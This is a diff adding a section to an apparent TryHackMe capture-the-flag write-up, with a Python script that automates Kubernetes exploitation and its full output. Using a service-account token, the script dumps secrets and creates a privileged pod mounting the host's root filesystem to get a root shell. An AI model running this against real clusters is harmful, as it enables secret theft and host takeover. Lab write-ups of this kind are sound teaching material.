@@ -660,6 +660,155 @@ uid=0(root) gid=0(root) groups=1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),
 
 And I'm root! :D
 
+> Note: I also made a [simple python script](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/PalsForLife/enumk8s.py) to automate this exploit process. :D
+
+```py
+#!/usr/bin/env python3
+
+import argparse
+import os
+from colorama import Fore, init
+import time
+
+init(autoreset=True)
+
+parser = argparse.ArgumentParser(description="This is an semiautomated python script that enumerating kubernetes cluster in 'PalsForLife' room in TryHackMe.")
+parser.add_argument("-t", "--token", help="Service account token")
+parser.add_argument("-u", "--url", help="The target machine's URL. E.g. https://10.10.44.205")
+parser.add_argument("-p", "--port", help="The port of the URL")
+args = parser.parse_args()
+
+def get_auth():
+    command = f"kubectl --server {args.url}:{args.port} --token {args.token} --insecure-skip-tls-verify auth can-i --list"
+    os.system(command)
+
+def get_res():
+    command = f"kubectl --server {args.url}:{args.port} --token {args.token} --insecure-skip-tls-verify api-resources --namespaced=true "
+    os.system(command)
+
+def get_name(resource):
+    command = f"kubectl --server {args.url}:{args.port} --token {args.token} --insecure-skip-tls-verify get {resource} --all-namespaces"
+    os.system(command)
+
+def ext_name(resource, name, namespace):
+    command = f"kubectl --server {args.url}:{args.port} --token {args.token} --insecure-skip-tls-verify get {resource} {name} -n {namespace} -o yaml"
+    os.system(command)
+
+def createpod():
+    print(Fore.CYAN + "Creating pod.yaml...")
+    os.system("""echo 'apiVersion: v1
+kind: Pod
+metadata:
+  name: pod
+  labels:
+    app: pod
+spec:
+  containers:
+  - name: pod
+    image: gitea/gitea:1.5.1
+    imagePullPolicy: IfNotPresent
+    volumeMounts:
+    - name: hostvolume
+      mountPath: /pod
+    ports:
+    - containerPort: 80
+    securityContext:
+     privileged: true
+  volumes:
+  - name: hostvolume
+    hostPath:
+      path: /' > pod.yaml
+        """)
+    command = f"kubectl --server {args.url}:{args.port} --token {args.token} --insecure-skip-tls-verify create -f pod.yaml"
+    os.system(command)
+
+def spawnshell():
+    print(Fore.CYAN + "-" * 10 + "Spawning a Root Shell :D" + "-" * 10)
+    command = f"kubectl --server {args.url}:{args.port} --token {args.token} --insecure-skip-tls-verify exec --tty --stdin pod '/bin/bash'"
+    os.system(command)
+
+print(Fore.CYAN + "-" * 10 + "Part 1: Getting Current Privileges" + "-" * 10)
+get_auth()
+
+print(Fore.CYAN + "-" * 10 + "Part 2: Getting Supported Resources" + "-" * 10)
+get_res()
+
+print(Fore.CYAN + "-" * 10 + "Part 3: Getting Resource" + "-" * 10)
+res = input("Which resources you want? E.g. secrets\n")
+get_name(res)
+
+print(Fore.CYAN + "-" * 10 + "Part 4: Extracting Name" + "-" * 10)
+name = input("Which name you want? E.g. flag3\n")
+namespace = input("Which namespace you want? E.g. kube-system\n")
+ext_name(res, name, namespace)
+
+print(Fore.CYAN + "-" * 10 + "Part 5: Spawning a Root Shell(Optional)" + "-" * 10)
+revshell = input("Do you need to spawn a root shell? Y/N\n")
+
+if revshell == "Y":
+    createpod()
+    time.sleep(2)
+    spawnshell()
+else:
+    print(Fore.CYAN + "Bye!")
+    exit()
+```
+
+**Output:**
+```
+┌──(root💀siunam)-[~/ctf/thm/ctf/PalsForLife]
+└─# python3 enumk8s.py -t "{Redacted_Token}" -u https://$RHOSTS -p 6443
+----------Part 1: Getting Current Privileges----------
+Resources   Non-Resource URLs   Resource Names   Verbs
+*.*         []                  []               [*]
+            [*]                 []               [*]
+----------Part 2: Getting Supported Resources----------
+NAME                        SHORTNAMES   APIVERSION                     NAMESPACED   KIND
+[...]
+secrets                                  v1                             true         Secret
+[...]
+----------Part 3: Getting Resource----------
+Which resources you want? E.g. secrets
+secrets
+NAMESPACE         NAME                                                 TYPE                                  DATA   AGE
+[...]
+kube-system       flag3                                                Opaque                                1      459d
+[...]
+----------Part 4: Extracting Name----------
+Which name you want? E.g. flag3
+flag3
+Which namespace you want? E.g. kube-system
+kube-system
+apiVersion: v1
+data:
+  flag3.txt: {Redacted}
+kind: Secret
+metadata:
+  annotations:
+    kubectl.kubernetes.io/last-applied-configuration: |
+      {"apiVersion":"v1","kind":"Secret","metadata":{"annotations":{},"name":"flag3","namespace":"kube-system"},"stringData":{"flag3.txt":"flag{Redacted}"},"type":"Opaque"}
+[...]
+type: Opaque
+----------Part 5: Spawning a Root Shell(Optional)----------
+Do you need to spawn a root shell? Y/N
+Y
+Creating pod.yaml...
+pod/pod created
+----------Spawning a Root Shell :D----------
+kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.
+bash-4.4# whoami;hostname;id;ip a
+root
+pod
+uid=0(root) gid=0(root) groups=1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+[...]
+3: eth0@if9: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 8951 qdisc noqueue state UP 
+    link/ether e6:cb:c8:59:b9:7e brd ff:ff:ff:ff:ff:ff
+    inet 10.42.0.15/24 brd 10.42.0.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::e4cb:c8ff:fe59:b97e/64 scope link 
+       valid_lft forever preferred_lft forever
+```
+
 # Rooted
 
 **root.txt:**
